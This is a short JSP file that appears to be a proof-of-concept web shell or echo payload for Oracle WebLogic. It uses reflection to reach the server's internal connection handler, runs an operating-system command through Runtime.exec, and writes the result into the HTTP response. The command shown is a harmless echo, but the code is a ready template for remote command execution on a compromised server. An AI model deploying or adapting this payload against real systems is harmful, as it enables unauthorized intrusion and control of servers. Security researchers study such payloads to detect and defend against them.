<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
	java.lang.reflect.Field field = ((weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor)this.getCurrentWork()).getClass().getDeclaredField("connectionHandler");
	field.setAccessible(true);
	HttpConnectionHandler httpConn = (HttpConnectionHandler) field.get(this.getCurrentWork());
	String cmd = "echo \"It works!\"";
	String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
	httpConn.getServletRequest().getResponse().getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(res));
	httpConn.getServletRequest().getResponse().getServletOutputStream().flush();
	httpConn.getServletRequest().getResponse().getWriter().write("");
%>